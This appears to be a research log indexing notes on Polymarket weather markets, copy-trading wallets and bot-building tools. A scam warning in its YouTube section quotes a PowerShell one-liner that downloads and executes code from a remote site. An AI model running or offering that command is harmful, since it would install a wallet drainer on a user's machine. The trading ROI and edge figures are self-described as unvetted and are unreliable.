# Polymarket Research Sprint — INDEX / RUNNING LOG

Started: 2026-06-12
Scope: **Weather markets** + **Copy-trading top wallets** (BTC latency = salvage notes only)
Mode: raw capture, unvetted, to be sorted later with Kavee.

## Files
- `weather_web.md` — articles/guides
- `weather_youtube.md` — transcript notes
- `weather_tools_repos.md` — bots, APIs, dashboards
- `copytrading_web.md` — leaderboards, filters, tools
- `copytrading_youtube.md` — transcript notes
- `copytrading_wallets.md` — named wallets + stats
- `btc_latency_salvage.md` — deprioritized notes

## Capture progress
- [x] Folder + index seeded
- [x] weather_web.md — thesis, model schedule, entry rule, resolution rules, ColdMath, risks
- [x] weather_tools_repos.md — 2 open-source bots (suislanchez, alteregoeth), APIs, configs
- [x] weather_hermes_build.md — Hermes Agent (Nous Research) full build = the "claude or hermes" ask
- [x] copytrading_web.md — mechanics, vetting filters, Poly Syncer full pricing/methodology
- [x] copytrading_wallets.md — weather leaderboard + Polycopy overall top-10
- [x] weather_youtube.md — BLOCKED status logged (IP 429 + Chrome cookie lock)
- [ ] copytrading_youtube.md — pending (YT blocked)
- [ ] btc_latency_salvage.md — pending light notes

## KEY WINS so far
- "Hermes" = Nous Research open-source agent framework; run it WITH Claude → autonomous weather bot.
- 2 ready-to-run open-source weather bots with full configs (alteregoeth = simplest start).
- Exact resolution: NWS CLI report, specific airport (KLGA/KDAL), settles 8AM ET next day.
- Edge math: ensemble-prob vs market price, bet at 8–10% EV, fractional Kelly 0.15–0.25, $10–20/bet.
- Best cities (low bot saturation): Buenos Aires, Cape Town, Dallas, Atlanta.
- Copy: Poly Syncer ($299 Pro/$499 Elite), filter Copy Score 70+ / win>60% / 200+ trades.

## Open threads / next queries
- Fetch Hermes repo README (NousResearch/hermes-agent) for real capabilities.
- Fetch Ezekiel "teach you how" article (medium.com/mountain-movers redirect).
- Classify Polycopy top-10 as bot vs human (avoid copying MMs).
- aenews2 + ColdMath wallet addresses.
- Visual Crossing vs Open-Meteo for resolution accuracy.
- RETRY YouTube transcripts after 429 cooldown / Chrome closed.

## ADDED LATER IN SESSION
- [x] weather_hermes_build.md — Hermes repo facts + Windows support + Claude via OpenRouter
- [x] weather_web.md — added NO-CODE manual playbook + exact resolution rules + ColdMath barbell
- [x] weather_tools_repos.md — added alteregoeth/weatherbot full config (simplest start)
- [x] copytrading_wallets.md — added discretionary traders (Theo4/beachboy4/HorizonSplendidView)
      + bot-vs-human selection rule + bot-dominance reality
- [x] btc_latency_salvage.md — written (deprioritized)
- [x] practical_blockers.md — 🚨 AU access (Polymarket + Kalshi BOTH block AU), fees, spreads, capital
- [x] 01_SYNTHESIS.md — ranking, recommended phased path, risk ledger, open questions
- [x] copytrading_youtube.md — blocked stub

## 🚨 TOP-LINE FINDINGS
1. **AU ACCESS IS THE REAL BLOCKER** — Polymarket ISP-blocked by ACMA (Aug 2025); Kalshi also
   excludes AU. Venue/jurisdiction must be solved before anything. (practical_blockers.md)
2. **Weather = best automatable edge**; 2 open-source bots ready (alteregoeth simplest).
3. **Hermes = Nous Research agent**; run WITH Claude for 24/7 autonomy (optional layer).
4. **Copy = filter hard**; copy slow humans (Theo4/beachboy4) not bots (14/20 top = bots).
5. **Weather edge is THIN** after 1.25% fee + 5–10% niche spread → use LIMIT (maker, 0 fee) orders.

## ❗ UNFINISHED (for next session)
- YouTube transcripts: BLOCKED (429 + Chrome cookie lock). FIX: quit Chrome → run
  `python polymarket_research/fetch_transcripts.py`, or wait for cooldown. 9 weather + 1 copy
  videos queued (IDs in the script). Notes go to weather_youtube.md / copytrading_youtube.md.
- Pull wallet ADDRESSES for Theo4/aenews2/ColdMath; classify full Polycopy top-50 bot-vs-human.
- Research AU-legal venue alternatives (the real unlock).

## 🎥 YOUTUBE — SOLVED VIA METADATA ROUTE (transcripts stayed blocked, got substance anyway)
Captions 429-blocked on every IP. Pivoted to yt-dlp metadata (NOT throttled): harvested
**132 videos** (26 curated + 106 wide; 16 high / 53 mid / 37 low-signal). Files:
- `youtube_findings.md` — EXTRACTED INTELLIGENCE (read this). Build blueprints, tools, edges, scam warning.
- `youtube_metadata.md` — raw dump, harvest #1 (26 curated).
- `youtube_metadata_2.md` — raw dump, harvest #2 (wide, 60+ auto-flagged high/mid/low-signal).
- Scripts: fetch_metadata.py, fetch_more.py (reusable; re-run to widen).

### 🔑 BIGGEST YOUTUBE WINS
- **Build your own bot with Claude Code** (Kavee already has it) — beats every sold bot:
  - The Prediction Engineer: Flask+SQLite+HTML real-time whale tracker via "God Prompt" (oRV-NpYEtuA).
  - The Prediction Engineer: 283-line news-SNIPER bot, Claude Code + Opus 4.5 (LKRVUSa_OYQ).
  - natestokens/polymarket-weather-bot: 173-member ensemble, honest +27.6% ROI (best weather repo).
- **Real builder toolkit:** OFFICIAL github.com/Polymarket/polymarket-cli (Rust, `-o json` for
  agents) + github.com/jon-becker/prediction-market-analysis (36GB Polymarket+Kalshi backtest dataset).
- **Advection / nowcasting edge** (nowcast.trade): intraday METAR obs beat day-ahead forecast → temp edge.
- **Cameron Predicts 76-min course** = best free curriculum.
- ⚠️ **MALWARE WARNING:** video 4JC0ZAv6qhQ tells you to run `powershell irm web05driver.com|iex` = drainer. NEVER run.
- New named weather trader: **meropi** (w/ gopfan2). Wallet sites: predictfolio.com, predicting.top.

## STATE (for resume)
13+ raw files in polymarket_research/raw/. Web + YouTube research deep & broad on weather +
copy trading (+ Claude-Code-build angle, which is the strongest practical path). fetch_more.py
may still be appending tail-end low-signal videos to youtube_metadata_2.md — harmless.
STILL THE #1 GATE: Australia access (Polymarket + Kalshi both block AU) — see practical_blockers.md.
Next session: start at 01_SYNTHESIS.md + youtube_findings.md → decide venue/access → then either
(a) build a tracker/bot with Claude Code (Prediction Engineer template + polymarket-cli), or
(b) manual weather playbook first. Optional: backtest via jon-becker dataset before risking $.
